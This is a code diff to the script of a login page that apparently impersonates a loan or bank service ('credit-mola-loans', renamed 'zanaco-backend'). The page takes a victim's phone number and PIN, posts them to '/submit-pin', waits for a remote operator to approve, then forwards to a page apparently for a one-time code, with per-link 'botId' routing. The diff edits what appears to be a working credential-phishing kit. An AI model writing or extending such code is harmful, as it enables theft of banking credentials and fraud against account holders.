@@ -117,27 +117,21 @@ button.enabled {
 </div>
 
 <script>
-const BACKEND_URL = "https://credit-mola-loans.onrender.com";
+const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
-// ---------------- USE DEFAULT BOT FROM BACKEND ----------------
-let botId = null;
-async function fetchDefaultBot() {
-    try {
-        const res = await fetch(`${BACKEND_URL}/debug/bots`);
-        const bots = await res.json();
-        if (!bots || bots.length === 0) throw new Error("No bots configured");
-        botId = bots[0].botId; // use first bot by default
-    } catch (err) {
-        alert("Unable to fetch bot configuration: " + err.message);
-        throw err;
-    }
+// ---------------- BOT ID ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+if (!botId) {
+    alert("Invalid access link");
+    throw new Error("botId missing");
 }
 
 // ---------------- PREFILL PHONE ----------------
 const phoneDisplay = document.getElementById('phoneDisplay');
 const phone = localStorage.getItem('phone');
 if (!phone) {
-    window.location.href = `details.html`;
+    window.location.href = `details.html?botId=${botId}`;
 }
 phoneDisplay.value = phone;
 
@@ -173,8 +167,6 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     button.disabled = true;
     button.textContent = 'Logging in...';
 
-    await fetchDefaultBot(); // ensure botId is set
-
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
@@ -204,7 +196,7 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
         if (d.approved === true) {
             clearInterval(poll);
-            window.location.href = `code.html?requestId=${requestId}`;
+            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
             return;
         }
 
